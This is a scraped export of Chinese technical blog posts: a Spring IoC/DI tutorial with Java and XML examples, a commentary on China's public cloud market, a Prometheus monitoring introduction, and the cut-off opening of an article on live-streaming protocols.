encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beanshttp:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans-4.3.xsd&quot;&gt; &lt;!-- xmlns 即 xml namespace xml 使用的命名空间 xmlns:xsi 即 xml schema instance xml 遵守的具体规范 xsi:schemaLocation 本文档 xml 遵守的规范 官方指定 --&gt; &lt;bean id&#x3D;&quot;userService&quot; class&#x3D;&quot;org.example.UserServiceImpl&quot;&gt; &lt;property name&#x3D;&quot;userDao&quot; ref&#x3D;&quot;userDao&quot;&#x2F;&gt; &lt;&#x2F;bean&gt; &lt;bean id&#x3D;&quot;userDao&quot; class&#x3D;&quot;org.example.UserDaoImpl&quot;&gt;&lt;&#x2F;bean&gt;&lt;&#x2F;beans&gt; 配置文件的名称可以是 applicationcontext.xml,也可以是其他，通常我们习惯使用 applicationcontext。 如上所示，在配置文件中xml 标签内的内容是指将定义xml 所遵循的规范。 Spring 要取得该 Bean 类，是根据bean标签中的 id、class 和 property name 和 ref 找到实例对象，从而获取对象的相关属性和值。通常多个 bean 包含在 beans 标签内，而 property 是 bean 对应的子元素。 BeanFactory 使用工厂涉及模式，负责读取 Bean 的配置文件，管理对象的生命周期和依赖关系，包括创建、加载和维护等。 org.springframework.beans.Factory.BeanFactory 是 BeanFactory 的顶级实现类。它会根据配置文件中的定义装载 Bean。Beanfactory 的常用方法有: getBea(String name) 可根据 Bean 的 id 生成 Bean 对象。 getBean(String name，Class requiredType) 可根据 Bean 的 id 和响应类生成 Bean 的对象。 ApplicationContext 接口提供了高级功能的容器，基本与BeanFactory 一致，不同之处是: 提供访问资源更方便。 支持国际化消息。 提供文件消息解析的方法 可以发布事件。 ApplicationContext 接口实现类有： FileSystemXmlApplicationContext，从文件使用绝对路径引入 xml 文件加载上下文。 ClassPathXmlApplicationContext,从类路径的 XML 中加载上下文。 XmlWebApplicationContext，从 Web 系统中的 XML 加载上下文 上面我们说了依赖注入和控制反转是对同一件事件的不同说明，依赖注入是在使用 spring 框架创建对象时，动态的将其所依赖的对象注入 Bean 组件中，一般通过量子方式 属性 setter 方法注入 通过构造方法注入 我们通过具体的案例来讲解 在 idea maven 项目中的 src 目录下建立如下目录结构 首先，创建一个 UserDao 接口，定义一个 login()方法 123456package org.example;public interface UserDao &#123; public void login();&#125; 然后创建一个 UserDao 接口的实现类UserDaoImpl 12345678package org.example;public class UserDaoImpl implements UserDao&#123; @Override public void login() &#123; System.out.println(&quot;UserDao login&quot;); &#125;&#125; 在src 目录下创建一个 applicationContext.xml 文件的 beans 标签下配置 1&lt;bean id&#x3D;&quot;UserDao&quot; class&#x3D;&quot;org.example.UserDaoImpl&quot;&gt;&lt;&#x2F;bean&gt; 然后创建一个IoC，如下所示 123456789101112131415package org.example;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class IoC &#123; public static void main(String[] args) &#123; &#x2F;&#x2F;1.初始化 Spring 容器，加载配置文件 ApplicationContext applicationContext &#x3D; new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;); &#x2F;&#x2F;2.通过容器获取 UserDao实例 UserDao userDao &#x3D; (UserDao) applicationContext.getBean(&quot;UserDao&quot;); userDao.login(); &#125;&#125; 执行后如下所示，我们可以看到通过 Spring 加载配置文件就可以操作就可以调用 userDao 的 login()方法。 接下来演示 DI 首先，我们创建UserService接口 12345package org.example;public interface UserService &#123; public void login();&#125; 然后创建一个UserServiceImpl 实现类并在类中调用 userDao 的 login() 12345678910111213141516package org.example;public class UserServiceImpl implements UserService &#123; &#x2F;&#x2F;声明 UserDao 属性 private UserDao userDao; &#x2F;&#x2F;添加 userDao 属性的 setter()方法，用于实现依赖注入 public void setUserDao(UserDao userDao)&#123; this.userDao &#x3D; userDao; &#125; &#x2F;&#x2F;实现接口中的方法 @Override public void login() &#123; this.userDao.login(); &#x2F;&#x2F;调用 userDao 中的 login() 方法 System.out.println(&quot;userService login&quot;); &#125;&#125; 然后在 applicationContext.xml 中配置property name 设置为 1234&lt;bean id&#x3D;&quot;userService&quot; class&#x3D;&quot;org.example.UserServiceImpl&quot;&gt; &lt;property name&#x3D;&quot;userDao&quot; ref&#x3D;&quot;userDao&quot;&#x2F;&gt;&lt;&#x2F;bean&gt;&lt;bean id&#x3D;&quot;UserDao&quot; class&#x3D;&quot;org.example.UserDaoImpl&quot;&gt;&lt;&#x2F;bean&gt; 最后我们创建一个 DI.java，代码如下所示 123456789101112package org.example;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class DI &#123; public static void main(String[] args) &#123; ApplicationContext applicationContext &#x3D; new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;); UserService userService &#x3D; (UserService) applicationContext.getBean(&quot;userService&quot;); userService.login(); &#125;&#125; 执行 DI，如下所示，我们可以看到Spring 通过userService实现类中的user.login()方法调用了 userDao 的 login()方法。","categories":[{"name":"Java","slug":"Java","permalink":"https://awen.me/categories/Java/"}],"tags":[{"name":"spring","slug":"spring","permalink":"https://awen.me/tags/spring/"}]},{"title":"公有云市场关闭潮或显端倪，企业如何选择服务商","slug":"公有云市场关闭潮或显端倪，企业如何选择服务商","date":"2020-03-23T09:10:40.000Z","updated":"2021-02-26T06:05:29.313Z","comments":true,"path":"posts/2fe4a4b9.html","link":"","permalink":"https://awen.me/posts/2fe4a4b9.html","excerpt":"","text":"本文版权归属 CSDN，作者 阿文 2020年3月12日，美团云正式对外发布公告，称因业务调整，美团公有云将于2020年5月31日0：00起，停止对用户的服务与支持，并回收资源。资源回收后将无法找回数据。这也是美团云在内部放弃公有云后两年，正式披露停服时间。 美团云是美团于2013年推出的公有云计算服务平台，成立至今，在华南、华北等多地建设了数据中心，并相继上线了云主机、存储、网络等产品。依托美团在O2O、餐饮、酒店、旅游等行业的经验，美团云还推出了餐饮云、酒店云、交通云等标准化行业解决方案。2015年，美团云正式独立运营，成立北京三快云计算有限公司。 除了美团云之前，在前几年各大巨头都纷纷推出公有云服务，例如滴滴云、百度云、京东云、金山云、华为云、网易云等等，各家推出的产品形态基本一致，都包含了云服务、数据库、对象存储、CDN、云硬盘等等。但是相比较阿里云、AWS、腾讯云等头部云计算厂商而言，这些企业进军公有云市场都比较晚。 据 IDC 最新发布的《中国公有云服务市场（2019上半年）跟踪》报告显示，2019上半年中国公有云服务整体市场规模达到54.2亿美元，其中IaaS市场增速稳健，同比增长72.2%，PaaS市场增速有所回落，同比增长92.6%。 因此笔者认为，在未来公有云市场或将迎来一波大转型，一些三四线公有云厂商或关闭或转型为内部用户服务。 对于三四线的中小型公有云厂商而言，他们所能够获得的用户并不多，因此投入的人力和物力也可想而知。因此在未来，这些厂商最终会关闭公有云服务或转型为内部用户服务以及私有云方向。 而目前公有云IaaS市场来看，阿里、腾讯、中国电信、AWS、华为位居前五，占据总体75.3%的市场份额。 阿里云，调研机构Canalys近日发布了2019年第四季度中国公有云服务市场报告称阿里云在2019年四季度中国公有云市场阿里云排名第一，阿里云通过其强大的生态和运营能力以及多样化的产品，阿里在中国（华北、华东、华南、香港）、新加坡、美国（美东、美西）、欧洲、中东、澳大利亚、日本都有相应的产品和服务，阿里云持续助力互联网行业业务系统上云，不断深耕零售、政府和金融三大行业云化转型。阿里云每年都会举办一次规模巨大的“云栖大会”。 从 2009 年阿里巴巴收购万网到并合并到阿里云旗下，阿里云已经成为全球领先的云计算及人工智能科技公司。服务着制造、金融、政务、交通、医疗、电信、能源等众多领域的领军企业，包括中国联通、12306、中石化、中石油、飞利浦、华大基因等大型企业客户，以及微博等明星互联网公司。在双11全球狂欢节、12306春运购票等极富挑战的应用场景中，阿里云始终保持着良好的运行纪录。 腾讯云借助腾讯集团其在游戏和视频领域的优势以及微信小程序等强大的生态转化能力优势，积极拓展产业互联网的发展机遇。同时腾讯云的产品形态也丰富多样、 AWS凭借其国际市场的领先地位，继续保持在中国企业出海市场的领先优势。AWS 作为云计算的先行者和领导者制定了各种标准。 华为云近几年驶入发展快车道，无论是从组织扩张、市场运营还是行业拓展上都表现突出。 百度云正逐步融合百度集团的生态体系，在不断丰富云服务综合能力的同时，持续增强视频、金融等细分行业的精耕细作。在2019ABC INSPIRE 百度云智峰会上，百度副总裁、百度智能云总经理尹世明宣布，“百度云”品牌全面升级为“百度智能云”。而从 IDC 发布的报告上，我们可以看到百度在PaaS市场表现仍然亮眼，其加速将AI底层技术和应用能力向云输入，刺激了百度云在该市场的长足增长。 事实上，随着疫情的影响，中国云计算服务商反应迅速，为政府、企业提供了云端计算能力、数字化系统、人工智能等服务，做出了突出贡献。受疫情影响政府和企业上云意愿加强，大部分未上云的企业正在评估上云路径，在未来一段时间内云计算服务商将获得更多新客户。而对于这些新客户如何选择适合自己的云平台呢？ 笔者认为，应该从企业的自身发展阶段以及各家云服务商给出的优惠力度和云厂商自身的产品性能等多个方面综合评估: 首先，企业可根据自身的预算多考察几家，包括头部企业和二三线云服务商，通过价格、产品形态和性能、稳定性等几个方面对比选择适合自己的平台。 第二，在选择云服务商时要重点考察下其运营能力和研发能力以及产品的完整性，可以通过阅读云厂商的官网文档分析对比出来，一个好的产品其文档应该是完整的详实的，从侧面也能看出来该云厂商的投入力度和研发能力。 第三，考察一个服务商的研发能力还有一个途径就是看其产品的迭代能力，可以考察其产品版本是否紧随开源产品的版本迭代，研发能力强的服务商其推出的产品版本或都较新，而同时研发能力强的企业通常在一些开源领域都会有所建树会积极投身和参与开源领域的产品迭代中。 第四，从售后流程和售后服务的态度来考察，当你遇到一些问题时是否能够快速的获得解决，这就包括上面说的文档的详实程度以及售后的服务水平。如何判断呢？可以通过考察官网文档以及问题的解决时间和质量上来考察。通常来说中小型客户如果选择使用大的服务商时一般所获得的支持力度会比较弱。因此不妨尝试使用一些二线优秀的服务商。 引用 1.IDC: 2019上半年中国公有云市场——硝烟四起，群雄逐鹿 https://www.idc.com/getdoc.jsp?containerId=prCHC45634819","categories":[{"name":"云计算","slug":"云计算","permalink":"https://awen.me/categories/%E4%BA%91%E8%AE%A1%E7%AE%97/"}],"tags":[{"name":"云计算","slug":"云计算","permalink":"https://awen.me/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"}]},{"title":"Prometheus 入门","slug":"Prometheus-入门","date":"2020-03-23T09:05:52.000Z","updated":"2021-02-26T06:05:29.261Z","comments":true,"path":"posts/4db42074.html","link":"","permalink":"https://awen.me/posts/4db42074.html","excerpt":"","text":"什么是PrometheusPrometheus是最初在SoundCloud上构建的开源系统监视和警报工具包 。自2012年成立以来，许多公司和组织都采用了Prometheus，这个项目发展到今天，已经全面接管了 Kubernetes 项目的整套监控体系。 Prometheus 项目与 Kubernetes 项目一样，也来自于 Google 的 Borg 体系，它的原型系统，叫作 BorgMon，是一个几乎与 Borg 同时诞生的内部监控系统。 使用prometheus 的优势Prometheus非常适合记录任何纯数字时间序列。它既适合以机器为中心的监视，也适合监视高度动态的面向服务的体系结构。在微服务世界中，它对多维数据收集和查询的支持是一种特别的优势。 Prometheus的设计旨在提高可靠性，使其成为中断期间要使用的系统，从而使您能够快速诊断问题。每个Prometheus服务器都是独立的，而不依赖于网络存储或其他远程服务。当基础结构的其他部分损坏时，您可以依靠它，而无需建立广泛的基础结构来使用它。 Prometheus 不适合哪些场景普罗米修斯重视可靠性。即使在故障情况下，也始终可以查看有关系统的可用统计信息。但是如果您需要100％的准确性（例如按请求计费），则Prometheus并不是一个很好的选择，因为所收集的数据可能不会足够详细和完整。在这种情况下，最好使用其他系统来收集和分析计费数据，并使用Prometheus进行其余的监视。 Prometheus 架构下图是 Prometheus 和它的组件的整体架构： 从图中可看到包含以下主要组件： Prometheus Server: 用于收集和存储时间序列数据。Prometheus Server是Prometheus组件中的核心部分，负责实现对监控数据的获取，存储以及查询。 Prometheus Server可以通过静态配置管理监控目标，也可以配合使用Service Discovery的方式动态管理监控目标，并从这些监控目标中获取数据。其次Prometheus Server需要对采集到的监控数据进行存储，Prometheus Server本身就是一个时序数据库，将采集到的监控数据按照时间序列的方式存储在本地磁盘当中。最后Prometheus Server对外提供了自定义的PromQL语言，实现对数据的查询以及分析。 Client Library: 客户端库，为需要监控的服务生成相应的 metrics 并暴露给 Prometheus server。当 Prometheus server 来 pull 时，直接返回实时状态的 metrics。 Push Gateway: 主要用于短期的 jobs。由于这类 jobs 存在时间较短，可能在 Prometheus 来 pull 之前就消失了。为此，这些 jobs 可以直接向 Prometheus server 端推送它们的 metrics。 Exporters: 用于暴露已有的第三方服务的 metrics 给 Prometheus。Exporter将监控数据采集的端点通过HTTP服务的形式暴露给Prometheus Server，Prometheus Server通过访问该Exporter提供的Endpoint端点，即可获取到需要采集的监控数据。 Alertmanager: 从 Prometheus server 端接收到 alerts 后，会进行去除重复数据，分组，并路由到对方的接受方式，发出报警。常见的接收方式有：电子邮件，pagerduty 等。 WEB UI：Prometheus Server内置的Express Browser UI，通过这个UI可以直接通过PromQL实现数据的查询以及可视化。一些其他的工具。 特点Prometheus的主要特点是： 多维数据模型（有metric名称和键值对确定的时间序列） 灵活的查询语言 不依赖分布式存储 通过pull方式采集时间序列，通过http协议传输 支持通过中介网关的push时间序列的方式 监控数据通过服务或者静态配置来发现 支持图表和dashboard等多种方式 Prometheus包含多个组件，其中有许多是可选的，例如： Prometheus主服务器，用来收集和存储时间序列数据 应用程序client代码库 短时jobs的push gateway 基于Rails/SQL的GUI dashboard 特殊用途的exporter（包括HAProxy、StatsD、Ganglia等） 用于报警的alertmanager 命令行工具查询 大多数的组件都是用Go来完成的，使得它们方便构建和部署。 下载并运行直接去GitHub 下载最新的版本官网网站 https://prometheus.io/下载地址 https://github.com/prometheus/prometheus/releases 下载后解压并进入到目录，执行 123[root@k8s prometheus-2.15.0.linux-amd64]# lsconsole_libraries consoles data LICENSE NOTICE prometheus prometheus.yml promtool tsdb[root@k8s prometheus-2.15.0.linux-amd64]# .&#x2F;prometheus 启动后程序会输出一些日志，默认监听的端口是9090，使用的是prometheus目录下的prometheus.yaml 配置文件，程序启动时首选会启动prometheus，然后启动TSDB(时序数据库) 1234567891011121314151617level&#x3D;info ts&#x3D;2019-12-24T06:34:56.601Z caller&#x3D;main.go:294 msg&#x3D;&quot;no time or size retention was set so using the default time retention&quot; duration&#x3D;15dlevel&#x3D;info ts&#x3D;2019-12-24T06:34:56.601Z caller&#x3D;main.go:330 msg&#x3D;&quot;Starting Prometheus&quot; version&#x3D;&quot;(version&#x3D;2.15.0, branch&#x3D;HEAD, revision&#x3D;ec1868b0267d13cb5967286fd5ec6afff507905b)&quot;level&#x3D;info ts&#x3D;2019-12-24T06:34:56.601Z caller&#x3D;main.go:331 build_context&#x3D;&quot;(go&#x3D;go1.13.5, user&#x3D;root@240f2f89177f, date&#x3D;20191223-12:03:32)&quot;level&#x3D;info ts&#x3D;2019-12-24T06:34:56.601Z caller&#x3D;main.go:332 host_details&#x3D;&quot;(Linux 3.10.0-957.el7.x86_64 #1 SMP Thu Nov 8 23:39:32 UTC 2018 x86_64 k8s (none))&quot;level&#x3D;info ts&#x3D;2019-12-24T06:34:56.601Z caller&#x3D;main.go:333 fd_limits&#x3D;&quot;(soft&#x3D;1024, hard&#x3D;4096)&quot;level&#x3D;info ts&#x3D;2019-12-24T06:34:56.602Z caller&#x3D;main.go:334 vm_limits&#x3D;&quot;(soft&#x3D;unlimited, hard&#x3D;unlimited)&quot;level&#x3D;info ts&#x3D;2019-12-24T06:34:56.604Z caller&#x3D;main.go:648 msg&#x3D;&quot;Starting TSDB ...&quot;level&#x3D;info ts&#x3D;2019-12-24T06:34:56.604Z caller&#x3D;web.go:506 component&#x3D;web msg&#x3D;&quot;Start listening for connections&quot; address&#x3D;0.0.0.0:9090level&#x3D;info ts&#x3D;2019-12-24T06:34:56.607Z caller&#x3D;head.go:584 component&#x3D;tsdb msg&#x3D;&quot;replaying WAL, this may take awhile&quot;level&#x3D;info ts&#x3D;2019-12-24T06:34:56.612Z caller&#x3D;head.go:632 component&#x3D;tsdb msg&#x3D;&quot;WAL segment loaded&quot; segment&#x3D;0 maxSegment&#x3D;2level&#x3D;info ts&#x3D;2019-12-24T06:34:56.616Z caller&#x3D;head.go:632 component&#x3D;tsdb msg&#x3D;&quot;WAL segment loaded&quot; segment&#x3D;1 maxSegment&#x3D;2level&#x3D;info ts&#x3D;2019-12-24T06:34:56.617Z caller&#x3D;head.go:632 component&#x3D;tsdb msg&#x3D;&quot;WAL segment loaded&quot; segment&#x3D;2 maxSegment&#x3D;2level&#x3D;info ts&#x3D;2019-12-24T06:34:56.618Z caller&#x3D;main.go:663 fs_type&#x3D;EXT4_SUPER_MAGIClevel&#x3D;info ts&#x3D;2019-12-24T06:34:56.618Z caller&#x3D;main.go:664 msg&#x3D;&quot;TSDB started&quot;level&#x3D;info ts&#x3D;2019-12-24T06:34:56.619Z caller&#x3D;main.go:734 msg&#x3D;&quot;Loading configuration file&quot; filename&#x3D;prometheus.ymllevel&#x3D;info ts&#x3D;2019-12-24T06:34:56.620Z caller&#x3D;main.go:762 msg&#x3D;&quot;Completed loading of configuration file&quot; filename&#x3D;prometheus.ymllevel&#x3D;info ts&#x3D;2019-12-24T06:34:56.620Z caller&#x3D;main.go:617 msg&#x3D;&quot;Server is ready to receive web requests.&quot; 此时通过浏览器访问，可以看到如下界面，这就是prometheus 的控制台 配置文件prometheus.yml 是prometheus 的配置文件，您可以使用如下命令来指定配置文件启动 prometheus 1prometheus --config.file&#x3D;prometheus.yml 它的默认配置如下 123456789101112131415161718192021222324252627282930# cat prometheus.yml# my global configglobal: scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute. evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute. # scrape_timeout is set to the global default (10s).# Alertmanager configurationalerting: alertmanagers: - static_configs: - targets: # - alertmanager:9093# Load rules once and periodically evaluate them according to the global &#39;evaluation_interval&#39;.rule_files: # - &quot;first_rules.yml&quot; # - &quot;second_rules.yml&quot;# A scrape configuration containing exactly one endpoint to scrape:# Here it&#39;s Prometheus itself.scrape_configs: # The job name is added as a label &#96;job&#x3D;&lt;job_name&gt;&#96; to any timeseries scraped from this config. - job_name: &#39;prometheus&#39; # metrics_path defaults to &#39;&#x2F;metrics&#39; # scheme defaults to &#39;http&#39;. static_configs: - targets: [&#39;localhost:9090&#39;] 包括了 global 全局配置 alerting 用来接收prometheus发出的告警，然后按照配置文件的要求，将告警用对应的方式发送出去。 rule_files 指定加载的告警规则文件 scrape_configs 指定prometheus要监控的目标 其中global是一些常规的全局配置，这里只列出了两个参数： scrape_interval: 15s #每15s采集一次数据 evaluation_interval: 15s #每15s做一次告警检测 scrape_configs指定prometheus要监控的目标，在scrape_config 中每个监控目标是一个 job，但job的类型有很多种。可以是最简单的static_config，即静态地指定每一个目标，例如上面的： 123- job_name: prometheus static_configs: - targets: [&#39;localhost:9090&#39;] 默认的配置文件scrape_configs 定义了一个job 对 prometheus 自身进行监控。您可以访问ip:9090/metrics 来访问 prometheus 自身的监控数据 我们用浏览器访问http://host:9090/metrics，即可看到一个instance向外暴露的监控指标。除了注释外，其它每一行都是一个监控指标项，大部分指标形如： 1go_info&#123;version&#x3D;&quot;go1.10.3&quot;&#125; 1 这里go_info即为度量指标名称，version为这个度量指标的标签，go1.10.3为这个度量指标version标签的值，1为这个度量指标当前采样的值，一个度量指标的标签可以有0个或多个标签。这就是上面说到的监控指标数据模型。 可以看到有些度量指标的形式如下： 1go_memstats_frees_total 131961 按prometheus官方建议的规范，以_total为后缀的度量指标一般类型是counter计数器类型。 有些度量指标的形式如下： 1go_memstats_gc_sys_bytes 213408 这种度量指标一般类型是gauge测量器类型。 有些度量指标的形式如下： 1prometheus_http_response_size_bytes_bucket&#123;handler&#x3D;&quot;&#x2F;metrics&quot;,le&#x3D;&quot;100&quot;&#125; 0prometheus_http_response_size_bytes_bucket&#123;handler&#x3D;&quot;&#x2F;metrics&quot;,le&#x3D;&quot;1000&quot;&#125; 0prometheus_http_response_size_bytes_bucket&#123;handler&#x3D;&quot;&#x2F;metrics&quot;,le&#x3D;&quot;10000&quot;&#125; 46prometheus_http_response_size_bytes_bucket&#123;handler&#x3D;&quot;&#x2F;metrics&quot;,le&#x3D;&quot;100000&quot;&#125; 46prometheus_http_response_size_bytes_bucket&#123;handler&#x3D;&quot;&#x2F;metrics&quot;,le&#x3D;&quot;1e+06&quot;&#125; 46prometheus_http_response_size_bytes_bucket&#123;handler&#x3D;&quot;&#x2F;metrics&quot;,le&#x3D;&quot;1e+07&quot;&#125; 46prometheus_http_response_size_bytes_bucket&#123;handler&#x3D;&quot;&#x2F;metrics&quot;,le&#x3D;&quot;1e+08&quot;&#125; 46prometheus_http_response_size_bytes_bucket&#123;handler&#x3D;&quot;&#x2F;metrics&quot;,le&#x3D;&quot;1e+09&quot;&#125; 46prometheus_http_response_size_bytes_bucket&#123;handler&#x3D;&quot;&#x2F;metrics&quot;,le&#x3D;&quot;+Inf&quot;&#125; 46prometheus_http_response_size_bytes_sum&#123;handler&#x3D;&quot;&#x2F;metrics&quot;&#125; 234233prometheus_http_response_size_bytes_count&#123;handler&#x3D;&quot;&#x2F;metrics&quot;&#125; 46 这种就是histogram柱状图类型。 还有的形式如下： 1go_gc_duration_seconds&#123;quantile&#x3D;&quot;0&quot;&#125; 7.3318e-05go_gc_duration_seconds&#123;quantile&#x3D;&quot;0.25&quot;&#125; 0.000118693go_gc_duration_seconds&#123;quantile&#x3D;&quot;0.5&quot;&#125; 0.000236845go_gc_duration_seconds&#123;quantile&#x3D;&quot;0.75&quot;&#125; 0.000337872go_gc_duration_seconds&#123;quantile&#x3D;&quot;1&quot;&#125; 0.000707002go_gc_duration_seconds_sum 0.003731953go_gc_duration_seconds_count 14 这种就是summary总结类型。 更多关于配置相关的说明，可以阅读官网文档 prometheus 的一些概念Jobs和Instances(任务和实例)就Prometheus而言，pull拉取采样点的端点服务称之为instance。多个这样pull拉取采样点的instance, 则构成了一个job。 例如, 一个被称作api-server的任务有四个相同的实例。 1job: api-server instance 1：1.2.3.4:5670 instance 2：1.2.3.4:5671 instance 3：5.6.7.8:5670 instance 4：5.6.7.8:5671 自动化生成的标签和时间序列当Prometheus拉取一个目标, 会自动地把两个标签添加到度量名称的标签列表中，分别是： job: 目标所属的配置任务名称api-server。 instance: 采样点所在服务: host:port 如果以上两个标签二者之一存在于采样点中，这个取决于honor_labels配置选项。 对于每个采样点所在服务instance，Prometheus都会存储以下的度量指标采样点： up{job=”[job-name]”, instance=”instance-id”}: up值=1，表示采样点所在服务健康; 否则，网络不通, 或者服务挂掉了 scrape_duration_seconds{job=”[job-name]”, instance=”[instance-id]”}: 尝试获取目前采样点的时间开销 scrape_samples_scraped{job=”[job-name]”, instance=”[instance-id]”}: 这个采样点目标暴露的样本点数量 up度量指标对服务健康的监控是非常有用的。 数据模型Prometheus从根本上存储的所有数据都是时间序列: 具有时间戳的数据流只属于单个度量指标和该度量指标下的多个标签维度。除了存储时间序列数据外，Prometheus也可以利用查询表达式存储5分钟的返回结果中的时间序列数据 metrics和labels(度量指标名称和标签)每一个时间序列数据由metric度量指标名称和它的标签labels键值对集合唯一确定。 这个metric度量指标名称指定监控目标系统的测量特征（如：http_requests_total- 接收http请求的总计数）. metric度量指标命名ASCII字母、数字、下划线和冒号，他必须配正则表达式[a-zA-Z_:][a-zA-Z0-9_:]*。 标签开启了Prometheus的多维数据模型：对于相同的度量名称，通过不同标签列表的结合, 会形成特定的度量维度实例。(例如：所有包含度量名称为/api/tracks的http请求，打上method=POST的标签，则形成了具体的http请求)。这个查询语言在这些度量和标签列表的基础上进行过滤和聚合。改变任何度量上的任何标签值，则会形成新的时间序列图 标签label名称可以包含ASCII字母、数字和下划线。它们必须匹配正则表达式[a-zA-Z_][a-zA-Z0-9_]*。带有_下划线的标签名称被保留内部使用。 标签labels值包含任意的Unicode码。 有序的采样值有序的采样值形成了实际的时间序列数据列表。每个采样值包括： 一个64位的浮点值 一个精确到毫秒级的时间戳 一个样本数据集是针对一个指定的时间序列在一定时间范围的数据收集。这个时间序列是由{=, …} ‘‘小结：指定度量名称和度量指标下的相关标签值，则确定了所关心的目标数据，随着时间推移形成一个个点，在图表上实时绘制动态变化的线条’’ Notation(符号)表示一个度量指标和一组键值对标签，需要使用以下符号： [metric name]{[label name]=[label value], …} 例如，度量指标名称是api_http_requests_total， 标签为method=&quot;POST&quot;, handler=&quot;/messages&quot; 的示例如下所示： api_http_requests_total{method=”POST”, handler=”/messages”} 这些命名和OpenTSDB使用方法是一样的 metrics类型 Prometheus 提供了四个核心的metrics类型。这四种类型目前仅在客户库和wire协议中区分。Prometheus服务还没有充分利用这些类型。不久的将来就会发生改变。 Counter(计数器)counter 是一个累计度量指标，它是一个只能递增的数值。计数器主要用于统计服务的请求数、任务完成数和错误出现的次数等等。计数器是一个递增的值。反例：统计goroutines的数量。 Gauge(测量器)gauge是一个度量指标，它表示一个既可以递增, 又可以递减的值。 测量器主要测量类似于温度、当前内存使用量等，也可以统计当前服务运行随时增加或者减少的Goroutines数量 Histogram(柱状图)histogram，是柱状图，在Prometheus系统中的查询语言中，有三种作用： 对每个采样点进行统计，打到各个分类值中(bucket) 对每个采样点值累计和(sum) 对采样点的次数累计和(count) 度量指标名称: [basename]的柱状图, 上面三类的作用度量指标名称 [basename]_bucket{le=”上边界”}, 这个值为小于等于上边界的所有采样点数量 [basename]_sum [basename]_count 小结：所以如果定义一个度量类型为Histogram，则Prometheus系统会自动生成三个对应的指标 使用histogram_quantile()函数, 计算直方图或者是直方图聚合计算的分位数阈值。 一个直方图计算Apdex值也是合适的, 当在buckets上操作时，记住直方图是累计的。 [Summary]总结类似histogram柱状图，summary是采样点分位图统计，(通常的使用场景：请求持续时间和响应大小)。 它也有三种作用： 对于每个采样点进行统计，并形成分位图。（如：正态分布一样，统计低于60分不及格的同学比例，统计低于80分的同学比例，统计低于95分的同学比例） 统计班上所有同学的总成绩(sum) 统计班上同学的考试总人数(count) 带有度量指标的[basename]的summary 在抓取时间序列数据展示。 观察时间的φ-quantiles (0 ≤ φ ≤ 1), 显示为[basename]{分位数=&quot;[φ]&quot;} [basename]_sum， 是指所有观察值的总和 [basename]_count, 是指已观察到的事件计数值 自定义监控上报监控指标上报系统自带的 exporter在prometheus的世界里70%的场景并不需要专门写埋点逻辑代码，因为已经有现成的各类exporter了，只要找到合适的exporter，启动exporter就直接暴露出一个符合prometheus规范的服务端点了。 exporter列表参见这里，另外官方git仓库里也有一些exporter。 举例，在某个宿主机上运行node_exporter后，以Centos为例，安装 12# curl -Lo &#x2F;etc&#x2F;yum.repos.d&#x2F;_copr_ibotty-prometheus-exporters.repo https:&#x2F;&#x2F;copr.fedorainfracloud.org&#x2F;coprs&#x2F;ibotty&#x2F;prometheus-exporters&#x2F;repo&#x2F;epel-7&#x2F;ibotty-prometheus-exporters-epel-7.repo# yum install node_exporter 然后执行 1node_exporter 如图所示 用浏览器访问http://${host_ip}:9100/metrics即可看到node_exporter暴露出的这个宿主机各类监控指标数据 然后在prometheus的配置文件里加入以下一段： 12345scrape_configs: ...... - job_name: &#39;node_monitor_demo&#39; static_configs: - targets: [&#39;$&#123;host_ip&#125;:9100&#39;] 然后在prometheus的web管理控制台里就可以查询到相应的监控指标了。在http://${HOST}:9090/graph界面里输入go_memstats_alloc_bytes{instance=&quot;${host_ip}:9100&quot;}点击Execute按钮即可。 将 ${host_ip} 替换成你的IP 如图 在控制台中，切换到Graph 可以看到对应的监控图标，在图标列中可以显示对应job 的监控指标 编写自定义的监控代码假如你的监控指标很特殊，需要自己写埋点上报逻辑代码，也是比较简单的。已经有各个语言的Client Libraries了，照着示例写就可以了。","categories":[{"name":"监控","slug":"监控","permalink":"https://awen.me/categories/%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"Prometheus","slug":"Prometheus","permalink":"https://awen.me/tags/Prometheus/"}]},{"title":"一文搞懂直播技术","slug":"一文搞懂直播技术","date":"2020-03-23T09:03:55.000Z","updated":"2021-02-26T06:05:29.295Z","comments":true,"path":"posts/bb1ee445.html","link":"","permalink":"https://awen.me/posts/bb1ee445.html","excerpt":"","text":"随着Web 2.0 的普及以及移动互联网技术的发展，各种视频分享、流媒体直播类型的服务应运而生，例如在线教育、我们会发现今年由于疫情的影响各大学校延迟开学，学生们不得不在家远程上课。各大企业因为疫情影响在家远程开会，各种互联网摄像头可以让你随时随地看到家里的动态，那么你知道这种直播技术他背后的原理吗？如果你想了解直播技术的背后原理， 欢迎继续阅读，我将带你揭开直播技术的神秘面纱。 认识直播技术背后的传输协议直播技术背后是由多种基于 IP 网络的传输协议组成，统称为流媒体网络传输协议，不同的传输协议应用的场景不一样，通过这些传输协议对数据进行封装后传输，尽可能的保证音视频的数据质量和延迟： RTMP (Real-Time Messaging Protocol，缩写RTMP)协议，他最早是由Macromedia为通过互联网在Flash播放器与一个服务器之间传输流媒体音频、视频和数据而开发的一个专有协议。后来这家公司被Adobe 收购，随后这个协议也已发布了不完整的规范供公众使用。由于其延迟相对较低被广泛的使用在各种直播平台上。比如游戏直播、美女直播、电视直播、在线教育等。 RSTP 协议，这种协议一般应用在各种安全监控摄像头上，比如各种家用的互联网摄像头，RTSP(Real Time Streaming Protocol)实时流协议，RTSP协议利用推式服务器(push 